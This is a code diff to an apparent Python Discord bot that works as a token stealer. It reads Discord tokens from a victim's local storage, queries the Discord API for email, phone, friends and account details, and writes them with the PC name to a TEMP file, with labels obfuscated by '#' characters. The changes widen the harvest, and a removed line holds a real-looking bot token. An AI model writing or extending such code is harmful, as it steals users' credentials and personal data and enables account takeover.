@@ -23,7 +23,7 @@ global token
 global guild_iD
 guild_iD = "984582818489331732"
 # guild id here
-token = "MTAwODQ5Nzk3MzkwNDI4MTc0Mg.Gt4iqj.eAYKAc7pTrFD-rI4kZ4Kl2ggRKBZ12j9t9bKZs"
+token = ""
 # Bot Token Here Obviously
 # Bot needs all intents
 ping_on_startup = True
@@ -237,8 +237,8 @@ def getDiscordData():
 		try:
 			return loads(
 				urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
-		except:
-			pass
+		except Exception as e:
+			print(e)
 
 	def getT0k3ns(path):
 		path += "\\Local Storage\\leveldb"
@@ -265,7 +265,10 @@ def getDiscordData():
 		working_ids = []
 		pc_username = os.getenv("UserName")
 		pc_name = os.getenv("COMPUTERNAME")
+		temp = os.getenv("TEMP")
 
+		with open(f"{temp}\\discordinfo.txt", "w") as f:
+			f.write("")
 		for platform, path in PATHS.items():
 			if not os.path.exists(path):
 				continue
@@ -279,10 +282,12 @@ def getDiscordData():
 						uid = b64decode(T0K3N.split(".")[0].encode()).decode()
 					except:
 						pass
-					if not uid or uid in working_ids:
-						continue
+					# if not uid or uid in working_ids:
+					# 	continue
 				user_data = getUserData(T0K3N)
 				if not user_data:
+					with open(f"{temp}\\discordinfo.txt", "a") as f:
+						f.write(T0K3N+"\n")
 					continue
 				working_ids.append(uid)
 				working.append(T0K3N)
@@ -293,9 +298,8 @@ def getDiscordData():
 				nitro = bool(user_data.get("premium_type"))
 				info = f"####Ma#i##l#: {email}\n#P#h##o##ne: ##{phone}\n#N#i#t#r3###o##: {nitro}\n#U#s#e#r#n#a#m#e: {pc_username}\n#P#C# #N#a#m####e: {pc_name}\nT##0##k##e##n Location: {platform}\nT##3#o##k##e##n #: {T0K3N}\nUsername: {username} ({user_id})\n\nUser Data: {user_data}\n\nFriends: {getFriends(T0K3N)}"
 				info = info.replace("#", "")
-				temp = os.getenv("TEMP")
-				with open(f"{temp}\\discordinfo.txt", "w") as f:
-					f.write(info)
+				with open(f"{temp}\\discordinfo.txt", "a") as f:
+					f.write(info+"\n")
 				f.close()
 
 	main()
